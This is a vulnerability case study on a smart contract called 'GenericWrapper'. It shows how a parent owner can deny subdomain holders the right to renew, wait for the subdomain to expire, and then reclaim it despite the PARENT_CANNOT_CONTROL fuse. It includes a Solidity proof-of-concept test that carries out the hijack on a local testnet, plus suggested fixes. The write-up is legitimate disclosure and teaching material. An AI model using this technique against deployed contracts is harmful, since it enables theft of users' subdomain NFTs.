# Case Study: Registry Permission Bypass (Domain Expiry Hijack)

## Vulnerability Type
**Severity**: Critical  
**Category**: Permission Bypass / NFT Theft

## Summary

The `GenericWrapper` contract aims to provide "Emancipated" subdomains where parent owner burns the `PARENT_CANNOT_CONTROL` (PCC) fuse, guaranteeing child owner full sovereignty.

However, a composite vulnerability allows malicious parent owner to **hijack any PCC-protected subdomain** by forcing expiry and exploiting expiration logic.

## Vulnerability Details

### Issue 1: Renewal Lockout

`extendExpiry` function requires `CAN_EXTEND_EXPIRY` fuse. This fuse is **Parent-Controlled**. If parent doesn't grant this fuse (default behavior), child owner **cannot** renew their own domain.

```solidity
if (!canExtendSubname && fuses & CAN_EXTEND_EXPIRY == 0) {
    revert OperationProhibited(node);
}
```

Malicious parent issues subdomain with PCC burned but `CAN_EXTEND_EXPIRY` unset. Child user is now powerless to prevent expiration.

### Issue 2: PCC Bypass via Expiry

In `_checkCanCallSetSubnodeOwner`:

```solidity
if (expired && ...) {
    // PCC check is SKIPPED here for expired names!
} else {
    if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {
        revert OperationProhibited(subnode);
    }
}
```

Once time expires (which child cannot prevent), parent calls `setSubnodeOwner`, bypassing PCC check and reclaiming subdomain NFT.

## Impact

### Critical - NFT Theft

This breaks core security promise of GenericWrapper. Users purchasing "Trustless" subdomains are actually subject to hidden time-lock rug pull mechanism controlled entirely by parent owner. Parent can reclaim all sold subdomains once initial expiry is reached.

### Violation of Trustless Security Model

Core value proposition of GenericWrapper's PCC fuses is to create trustless subnames independent of parent's control. This vulnerability re-introduces dependency on parent's benevolence.

Furthermore, if Parent's private key is compromised, attacker can utilize this vector to hijack all high-value subdomains relying on PCC for security, significantly expanding blast radius of key compromise.

## Attack Flow

### Test Environment
- **Network**: Local Testnet
- **Contracts**: GenericWrapper, GenericRegistry

### Attack Steps

1. **Register parent domain** "parent.test"
2. **Wrap domain** into GenericWrapper
3. **Create subdomain** "sub.parent.test" for CHILD_OWNER
   - Burn PCC (PARENT_CANNOT_CONTROL)
   - **Don't** set CAN_EXTEND_EXPIRY
   - Set expiry: 30 days
4. **Verify initial state**:
   - Owner = CHILD_OWNER
   - PCC burned
5. **Time advance** 31 days (past expiry)
6. **Parent hijacks**:
   - Call `setSubnodeOwner`
   - Reset owner to PARENT_OWNER
   - PCC check bypassed (because expired)
7. **Verify hijack**:
   - New owner = PARENT_OWNER
   - PCC cleared

### Test Code

```solidity
function testParentCanHijackExpiredSubdomain() public {
    // 1. Register and wrap parent domain
    string memory label = "parent-hijack-test";
    uint256 tokenId = uint256(keccak256(abi.encodePacked(label)));
    
    registrar.register(tokenId, PARENT_OWNER, 365 days);
    bytes32 parentNode = keccak256(abi.encodePacked(ETH_NODE, keccak256(bytes(label))));

    vm.startPrank(PARENT_OWNER);
    registrar.setApprovalForAll(address(wrapper), true);
    wrapper.wrapETH2LD(label, PARENT_OWNER, uint16(CANNOT_UNWRAP), address(0));
    
    // 2. Create subdomain, burn PCC but don't grant CAN_EXTEND_EXPIRY
    uint64 expiry = uint64(block.timestamp + 30 days);
    uint32 fuses = uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);
    
    bytes32 subNode = wrapper.setSubnodeOwner(
        parentNode, 
        "sub", 
        CHILD_OWNER, 
        fuses, 
        expiry
    );
    vm.stopPrank();

    // 3. Verify initial state
    (address ownerBefore, uint32 fusesBefore, ) = wrapper.getData(uint256(subNode));
    require(ownerBefore == CHILD_OWNER, "Setup Failed");
    require(fusesBefore & PARENT_CANNOT_CONTROL != 0, "PCC not set");

    // 4. Time advance past expiry
    vm.warp(block.timestamp + 31 days);

    // 5. Parent hijacks
    vm.startPrank(PARENT_OWNER);
    wrapper.setSubnodeOwner(
        parentNode, 
        "sub", 
        PARENT_OWNER, 
        0, 
        uint64(block.timestamp + 365 days)
    );
    vm.stopPrank();

    // 6. Verify hijack successful
    (address newOwner, uint32 newFuses, ) = wrapper.getData(uint256(subNode));
    assertEq(newOwner, PARENT_OWNER, "Parent should have reclaimed ownership");
    assertTrue(newFuses & PARENT_CANNOT_CONTROL == 0, "PCC should be cleared");
}
```

## Remediation

### Solution 1: Allow Self-Renewal

Allow `GenericWrapper` owners to always extend their own expiry (up to parent's expiry), regardless of fuses.

### Solution 2: Enforce PCC Checks

Enforce PCC checks even for expired domains, unless parent also holds `PARENT_CANNOT_CONTROL` fuse (meaning they're also unwrapped owner).

## Key Takeaways

1. **Permission Design Flaws**: Renewal permissions shouldn't be parent-controlled
2. **Expiry Handling Risks**: Expiry state shouldn't bypass critical security checks
3. **Fuse Mechanism**: Permission fuses must comprehensively cover all operation paths
4. **Time-Lock Risks**: Time-based permission changes can be exploited

## Related Concepts

- Domain registry systems
- NFT ownership models
- Permission fuse mechanisms
- Time-lock attacks

---

**Tags**: #registry #permission-bypass #nft-theft #expiry-exploit
